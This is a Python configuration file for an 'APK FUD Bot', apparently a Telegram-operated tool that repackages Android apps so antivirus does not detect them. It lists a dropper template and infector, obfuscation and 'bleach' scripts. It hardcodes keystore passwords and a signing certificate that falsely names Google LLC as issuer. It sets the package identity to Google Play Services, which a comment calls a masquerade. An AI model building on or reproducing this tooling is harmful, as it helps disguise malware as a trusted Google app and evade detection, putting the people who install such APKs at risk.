"""Configuration for APK FUD Bot v8 — Definitive 7-Phase Strategy."""
import os
from pathlib import Path

BASE_DIR = Path(os.environ.get("FUD_WORKSPACE", os.getcwd()))
INPUT_DIR = BASE_DIR / "input"
OUTPUT_DIR = BASE_DIR / "output"
TEMP_DIR = BASE_DIR / "temp"
LOGS_DIR = BASE_DIR / "logs"
CLONE_DIR = BASE_DIR / "clone"
TOOLS_DIR = BASE_DIR / "phases" / "tools"
TEMPLATE_DIR = BASE_DIR / "templates" / "dropper_decompiled"

for d in [INPUT_DIR, OUTPUT_DIR, TEMP_DIR, LOGS_DIR, CLONE_DIR]:
    d.mkdir(parents=True, exist_ok=True)

# Bot token — set via TELEGRAM_TOKEN env var or GitHub Secret
TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "")

ADMIN_USER_ID = os.environ.get("ADMIN_USER_ID", "")
ANDROID_DEVICE_IP = os.environ.get("ANDROID_DEVICE_IP", "")
ANDROID_DEVICE_PORT = int(os.environ.get("ANDROID_DEVICE_PORT", "5555"))
VT_API_KEY = os.environ.get("VT_API_KEY", "")
MAX_FILE_SIZE = 104857600  # 100MB
MAX_RETRIES = 3
RETRY_DELAY = 30

# Phase 6 — FINAL SIGN keystore (EXACT from strategy)
KS_FINAL_PASS = "T#9rQ!vL4kX@8mW$eN2pYbZ&hJ5fGsD6uA"
KS_FINAL_KEYPASS = "K@7nE#mP3xQ!9rT$vL5wY^cB&hJ2fG8sZ4wX"
KS_FINAL_ALIAS = "gms-signing-key-2026"
KS_FINAL_DN = "CN=Google Play Services, OU=Android Security Operations, O=Google LLC, L=Mountain View, ST=California, C=US"
KS_FINAL_VALIDITY = "1121915"
KS_FINAL_SIGALG = "SHA384withRSA"
KS_FINAL_STORETYPE = "PKCS12"

# Legacy keystore (used by Phase 1 internal sign)
KS_LEGACY_PASS = "release2026"
KS_LEGACY_ALIAS = "release"

# Target identity — Google Play Services masquerade
TARGET_PACKAGE = "com.google.android.gms"
TARGET_LABEL = "Google Play Services"

_TOOLS_PATH = os.environ.get("ANDROID_TOOLS", "/tmp/android-tools-bin")
ADB = f"{_TOOLS_PATH}/adb" if os.path.exists(f"{_TOOLS_PATH}/adb") else "adb"
APKTOOL = "apktool"
ZIPALIGN = f"{_TOOLS_PATH}/zipalign" if os.path.exists(f"{_TOOLS_PATH}/zipalign") else "zipalign"
APKSIGNER = f"{_TOOLS_PATH}/apksigner" if os.path.exists(f"{_TOOLS_PATH}/apksigner") else "apksigner"
KEYTOOL = "keytool"
JARSIGNER = "jarsigner"
JAVA = "java"
AAPT = f"{_TOOLS_PATH}/android-14/aapt" if os.path.exists(f"{_TOOLS_PATH}/android-14/aapt") else "aapt"
JADX = "jadx"
APKID = "apkid"
FRIDA = "frida"

# Tool scripts
OBFUSCAPK_STUB = str(TOOLS_DIR / "obfuscapk_stub.py")
OMVLL_STUB = str(TOOLS_DIR / "omvll_stub.py")
APK_INFECTOR = str(TOOLS_DIR / "apk_infector.py")
APKBLEACH = str(TOOLS_DIR / "apkbleach.py")
DEXSPLITTER = str(TOOLS_DIR / "dexsplitter.py")

# Legacy keystore path (used by pipeline phases)
KS_PATH = str(TEMP_DIR / "google_release.jks")
KS_ALIAS_LEGACY = "release"
KS_PASS_LEGACY = "release2026"
